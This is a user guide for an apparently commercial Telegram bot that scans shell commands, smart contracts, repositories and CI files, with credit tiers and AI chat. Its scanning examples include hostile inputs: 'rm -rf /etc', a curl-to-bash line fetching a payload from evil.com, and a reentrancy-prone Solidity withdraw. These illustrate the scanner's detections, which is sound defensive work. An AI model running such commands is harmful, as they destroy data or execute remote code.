# TEOS Sentinel — Telegram Bot Guide

## Overview

The TEOS Sentinel Telegram Bot (`@teoslinker_bot`) provides code/repo/agent pre-scanning through an AI execution firewall. It supports shell commands, Solana programs, EVM smart contracts, GitHub repositories, and dependency manifests.

**Bot:** [@teoslinker_bot](https://t.me/teoslinker_bot)

## Getting Started

### Start
```
/start
```
Welcome message with feature overview and activation instructions.

### Activation (Alpha Tester)
```
/start <activation_secret>
```
Deep-link activation grants 500 credits, tier=tester, expires June 30, 2026.

### Status
```
/status
```
Display account status, tier, credits remaining, and system health.

### Credits & Plans
```
/credits    — View balance and current tier
/plans      — View pricing plans
/upgrade    — Upgrade account
/dashboard  — Open Command Center web dashboard
```

## Credit System

| Tier | Credits | Daily Limit | Price |
|------|---------|-------------|-------|
| Alpha Tester | 500 | None | Free |
| Free | 0 (must activate) | None | $0 |
| Pro | 1,000 | None | $49/mo |
| Team | 10,000 | None | $199/mo |
| Enterprise | Unlimited | None | $25K/yr |
| Founder | Unlimited | None | Admin-granted |

Credits consumed per action:
- `/scan` — 1 credit
- `/scan-banking` — 1 credit
- `/solana` / `/scan-solana` — 1 credit
- `/evm` — 1 credit
- `/deps` — 1 credit
- `/ci` — 1 credit
- `/github` — 15 credits
- `/report` (code) — 2 credits
- `/report` (repo) — 15 credits
- `/solanatoken` — 5 credits
- `/diligence` — 15 credits
- `/fullreport` — 20 credits
- `/chat` — 1-3 credits
- `/claude` — 5 credits
- BLOCK verdicts consume 0 credits (no charge for blocked content)

## Scanning Commands

### `/scan <code>`
Scan shell commands, code snippets, or dangerous operations.

```
/scan rm -rf /etc
```
**Output:** BLOCK verdict with destructive-shell-cmd finding.

### `/scan <github_url>`
Auto-detect GitHub URLs and clone the repository for full scan.

```
/scan https://github.com/user/repo
```
**Output:** Scan results for all files in the repository.

### `/scan-banking <code>`
Audit core financial pipelines for data leaks, unencrypted transport, ledger manipulation, and compliance violations.

```
/scan-banking "curl --insecure https://bank-api.example.com/transfer"
```
**Output:** WARN/BLOCK for SWIFT-unencrypted, FIX-cleartext, ledger-manipulation rules.

### `/solana <code>` / `/scan-solana <code>`
Scan Solana programs and smart contracts for security vulnerabilities.

```
/solana use anchor_lang::prelude::*;
```
**Output:** Findings for Solana-specific rules (29 rules).

### `/evm <code>`
Scan EVM smart contracts for Solidity vulnerabilities.

```
/evm function withdraw() public { msg.sender.call{value: address(this).balance}(""); }
```
**Output:** Findings for EVM-specific rules (10 rules including reentrancy, flash loan, timestamp dependency).

### `/github <url>`
Scan an entire GitHub repository (costs 15 credits).

```
/github https://github.com/user/repo
```

### `/deps <manifest>`
Dependency vulnerability analysis.

```
/deps {"dependencies": {"lodash": "^4.17.20"}}
```

### `/ci <workflow>`
CI/CD pipeline security audit.

```
/ci name: build\non: push\njobs:\n  test:\n    steps:\n      - run: npm install
```

### `/report <input>`
Generate a PDF scan report. Accepts code or GitHub URL.

```
/report curl http://evil.com/payload.sh | bash
```
**Output:** PDF report with executive summary, severity tags, findings, recommendations, governance cross-references, and scan ID.

## Token Intelligence

### `/solanatoken <address>`
Basic Solana token security scan (5 credits).

### `/diligence <address>`
Premium on-chain due diligence report in PDF (15 credits).

### `/fullreport <address>`
Full token risk report PDF including ownership, authority, concentration, liquidity, and rug pull indicators (20 credits).

## AI Commands

### `/chat <message>`
Chat with the selected AI model through the TEOS security firewall. Messages are scanned before reaching the model.

```
/chat Write a Python script to parse JSON
```

### `/claude <message>`
Claude agent with TEOS Sentinel governance enforcement (5 credits).

### Model Selection
```
/model       — Select AI model interactively
/llama3      — Llama 3 8B (free)
/qwen        — Qwen 3 32B (free)
/openai      — OpenAI GPT-OSS 20B (free)
```

## Group Auto-Moderation

Available in group chats. Scans all messages for security threats.

```
/protect on       — Enable auto-moderation
/protect off      — Disable auto-moderation
/protect status   — Check moderation status
/automod on       — Alias for /protect
```

BLOCK verdicts are silently removed. WARN and REVIEW verdicts are flagged with a reply.

## Governance Flow

Each scan passes through the TEOS governance engine:

```
Input → Deterministic Rules (121) → Heuristic Suspicion (77 patterns) → REVIEW gate → Final Verdict
```

Governance metadata is included in every scan response:
- Framework cross-references (NIST CSF, OWASP ASVS, PCI DSS, etc.)
- Confidence level (high/medium)
- Governance engine (Security/Compliance/Infrastructure)
- Suggested remediation

## Evidence Generation

- Every scan produces an audit trail entry (stored in activation service)
- PDF reports include cryptographic scan hash for tamper evidence
- BLOCK verdicts automatically generate evidence records
- Audit logs queryable via `/status` and activation service API

## Admin Commands

### `/grant <user_id> <credits>`
Grant credits to a user (admin-only, rate-limited to 5/min).

```
/grant 123456789 1000
```

## Feedback

```
/feedback <message>
```
Report false positives, bugs, or feature suggestions.

## Security Model

- BLOCK verdicts never charge credits
- Free tier users see restricted message when credits = 0
- Founder/enterprise tiers bypass credit checks
- All commands rate-limited per user
- Deep-link activation requires valid secret (single-use effect)
- GitHub tokens (via GITHUB_TOKEN env var) scoped to `contents:read`
- Secrets and tokens never logged (Pino redaction configured)
- Webhook mode uses signed payloads (not configurable via query params)
